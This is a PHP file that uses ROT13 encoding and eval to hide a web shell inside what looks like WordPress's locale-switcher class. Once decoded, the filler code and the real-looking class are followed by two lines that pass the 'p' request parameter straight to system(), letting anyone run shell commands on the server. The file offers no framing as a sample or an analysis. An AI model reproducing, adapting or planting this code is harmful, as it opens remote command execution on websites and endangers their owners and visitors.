<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ybpnyr NCV: JC_Ybpnyr_Fjvgpure pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr v18a
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq sbe fjvgpuvat ybpnyrf.
 *
 * @fvapr 4.7.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Ybpnyr_Fjvgpure {
	/**
	 * Ybpnyr fjvgpuvat fgnpx.
	 *
	 * @fvapr 6.2.0
	 * @ine neenl
	 */
	cevingr $fgnpx = neenl();

	/**
	 * Bevtvany ybpnyr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cevingr $bevtvany_ybpnyr;

	/**
	 * Ubyqf nyy ninvynoyr ynathntrf.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat[] Na neenl bs ynathntr pbqrf (svyr anzrf jvgubhg gur .zb rkgrafvba).
	 */
	cevingr $ninvynoyr_ynathntrf;

	/**
	 * Pbafgehpgbe.
	 *
	 * Fgberf gur bevtvany ybpnyr nf jryy nf n yvfg bs nyy ninvynoyr ynathntrf.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->bevtvany_ybpnyr     = qrgrezvar_ybpnyr();
		$guvf->ninvynoyr_ynathntrf = neenl_zretr( neenl( 'ra_HF' ), trg_ninvynoyr_ynathntrf() );
	}

	/**
	 * Vavgvnyvmrf gur ybpnyr fjvgpure.
	 *
	 * Ubbxf vagb gur {@frr 'ybpnyr'} naq {@frr 'qrgrezvar_ybpnyr'} svygref
	 * gb punatr gur ybpnyr ba gur syl.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba vavg() {
		nqq_svygre( 'ybpnyr', neenl( $guvf, 'svygre_ybpnyr' ) );
		nqq_svygre( 'qrgrezvar_ybpnyr', neenl( $guvf, 'svygre_ybpnyr' ) );
	}

	/**
	 * Fjvgpurf gur genafyngvbaf nppbeqvat gb gur tvira ybpnyr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat    $ybpnyr  Gur ybpnyr gb fjvgpu gb.
	 * @cnenz vag|snyfr $hfre_vq Bcgvbany. Hfre VQ nf pbagrkg. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba fjvgpu_gb_ybpnyr( $ybpnyr, $hfre_vq = snyfr ) {
		$pheerag_ybpnyr = qrgrezvar_ybpnyr();
		vs ( $pheerag_ybpnyr === $ybpnyr ) {
			erghea snyfr;
		}

		vs ( ! va_neenl( $ybpnyr, $guvf->ninvynoyr_ynathntrf, gehr ) ) {
			erghea snyfr;
		}

		$guvf->fgnpx[] = neenl( $ybpnyr, $hfre_vq );

		$guvf->punatr_ybpnyr( $ybpnyr );

		/**
		 * Sverf jura gur ybpnyr vf fjvgpurq.
		 *
		 * @fvapr 4.7.0
		 * @fvapr 6.2.0 Gur `$hfre_vq` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat    $ybpnyr  Gur arj ybpnyr.
		 * @cnenz snyfr|vag $hfre_vq Hfre VQ sbe pbagrkg vs ninvynoyr.
		 */
		qb_npgvba( 'fjvgpu_ybpnyr', $ybpnyr, $hfre_vq );

		erghea gehr;
	}

	/**
	 * Fjvgpurf gur genafyngvbaf nppbeqvat gb gur tvira hfre'f ybpnyr.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz vag $hfre_vq Hfre VQ.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba fjvgpu_gb_hfre_ybpnyr( $hfre_vq ) {
		$ybpnyr = trg_hfre_ybpnyr( $hfre_vq );
		erghea $guvf->fjvgpu_gb_ybpnyr( $ybpnyr, $hfre_vq );
	}

	/**
	 * Erfgberf gur genafyngvbaf nppbeqvat gb gur cerivbhf ybpnyr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea fgevat|snyfr Ybpnyr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba erfgber_cerivbhf_ybpnyr() {
		$cerivbhf_ybpnyr = neenl_cbc( $guvf->fgnpx );

		vs ( ahyy === $cerivbhf_ybpnyr ) {
			// Gur fgnpx vf rzcgl, onvy.
			erghea snyfr;
		}

		$ragel  = raq( $guvf->fgnpx );
		$ybpnyr = vf_neenl( $ragel ) ? $ragel[0] : snyfr;

		vs ( ! $ybpnyr ) {
			// Gurer'f abguvat yrsg va gur fgnpx: tb onpx gb gur bevtvany ybpnyr.
			$ybpnyr = $guvf->bevtvany_ybpnyr;
		}

		$guvf->punatr_ybpnyr( $ybpnyr );

		/**
		 * Sverf jura gur ybpnyr vf erfgberq gb gur cerivbhf bar.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz fgevat $ybpnyr          Gur arj ybpnyr.
		 * @cnenz fgevat $cerivbhf_ybpnyr Gur cerivbhf ybpnyr.
		 */
		qb_npgvba( 'erfgber_cerivbhf_ybpnyr', $ybpnyr, $cerivbhf_ybpnyr[0] );

		erghea $ybpnyr;
	}

	/**
	 * Erfgberf gur genafyngvbaf nppbeqvat gb gur bevtvany ybpnyr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea fgevat|snyfr Ybpnyr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba erfgber_pheerag_ybpnyr() {
		vs ( rzcgl( $guvf->fgnpx ) ) {
			erghea snyfr;
		}

		$guvf->fgnpx = neenl( neenl( $guvf->bevtvany_ybpnyr, snyfr ) );

		erghea $guvf->erfgber_cerivbhf_ybpnyr();
	}

	/**
	 * Jurgure fjvgpu_gb_ybpnyr() vf va rssrpg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea obby Gehr vs gur ybpnyr unf orra fjvgpurq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_fjvgpurq() {
		erghea ! rzcgl( $guvf->fgnpx );
	}

	/**
	 * Ergheaf gur ybpnyr pheeragyl fjvgpurq gb.
	 *
	 * @fvapr 6.2.0
	 *
	 * @erghea fgevat|snyfr Ybpnyr vs gur ybpnyr unf orra fjvgpurq, snyfr bgurejvfr.
	 */
	choyvp shapgvba trg_fjvgpurq_ybpnyr() {
		$ragel = raq( $guvf->fgnpx );

		vs ( $ragel ) {
			erghea $ragel[0];
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf gur hfre VQ eryngrq gb gur pheeragyl fjvgpurq ybpnyr.
	 *
	 * @fvapr 6.2.0
	 *
	 * @erghea vag|snyfr Hfre VQ vs frg naq vs gur ybpnyr unf orra fjvgpurq, snyfr bgurejvfr.
	 */
	choyvp shapgvba trg_fjvgpurq_hfre_vq() {
		$ragel = raq( $guvf->fgnpx );

		vs ( $ragel ) {
			erghea $ragel[1];
		}

		erghea snyfr;
	}

	/**
	 * Svygref gur ybpnyr bs gur JbeqCerff vafgnyyngvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $ybpnyr Gur ybpnyr bs gur JbeqCerff vafgnyyngvba.
	 * @erghea fgevat Gur ybpnyr pheeragyl orvat fjvgpurq gb.
	 */
	choyvp shapgvba svygre_ybpnyr( $ybpnyr ) {
		$fjvgpurq_ybpnyr = $guvf->trg_fjvgpurq_ybpnyr();

		vs ( $fjvgpurq_ybpnyr ) {
			erghea $fjvgpurq_ybpnyr;
		}

		erghea $ybpnyr;
	}

	/**
	 * Ybnq genafyngvbaf sbe n tvira ybpnyr.
	 *
	 * Jura fjvgpuvat gb n ybpnyr, genafyngvbaf sbe guvf ybpnyr zhfg or ybnqrq sebz fpengpu.
	 *
	 * @fvapr 4.7.0
	 *
	 * @tybony Zb[] $y10a Na neenl bs nyy pheeragyl ybnqrq grkg qbznvaf.
	 *
	 * @cnenz fgevat $ybpnyr Gur ybpnyr gb ybnq genafyngvbaf sbe.
	 */
	cevingr shapgvba ybnq_genafyngvbaf( $ybpnyr ) {
		tybony $y10a;

		$qbznvaf = $y10a ? neenl_xrlf( $y10a ) : neenl();

		ybnq_qrsnhyg_grkgqbznva( $ybpnyr );

		sbernpu ( $qbznvaf nf $qbznva ) {
			// Gur qrsnhyg grkg qbznva vf unaqyrq ol `ybnq_qrsnhyg_grkgqbznva()`.
			vs ( 'qrsnhyg' === $qbznva ) {
				pbagvahr;
			}

			/*
			 * Haybnq pheerag grkg qbznva ohg nyybj gurz gb or erybnqrq
			 * nsgre fjvgpuvat onpx be gb nabgure ybpnyr.
			 */
			haybnq_grkgqbznva( $qbznva, gehr );
			trg_genafyngvbaf_sbe_qbznva( $qbznva );
		}
	}

	/**
	 * Punatrf gur fvgr'f ybpnyr gb gur tvira bar.
	 *
	 * Ybnqf gur genafyngvbaf, punatrf gur tybony `$jc_ybpnyr` bowrpg naq hcqngrf
	 * nyy cbfg glcr ynoryf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
	 * @tybony CUCZnvyre\CUCZnvyre\CUCZnvyre $cucznvyre
	 *
	 * @cnenz fgevat $ybpnyr Gur ybpnyr gb punatr gb.
	 */
	cevingr shapgvba punatr_ybpnyr( $ybpnyr ) {
		tybony $jc_ybpnyr, $cucznvyre;

		$guvf->ybnq_genafyngvbaf( $ybpnyr );

		$jc_ybpnyr = arj JC_Ybpnyr();

		JC_Genafyngvba_Pbagebyyre::trg_vafgnapr()->frg_ybpnyr( $ybpnyr );

		vs ( $cucznvyre vafgnaprbs JC_CUCZnvyre ) {
			$cucznvyre->frgYnathntr();
		}

		/**
		 * Sverf jura gur ybpnyr vf fjvgpurq gb be erfgberq.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz fgevat $ybpnyr Gur arj ybpnyr.
		 */
		qb_npgvba( 'punatr_ybpnyr', $ybpnyr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>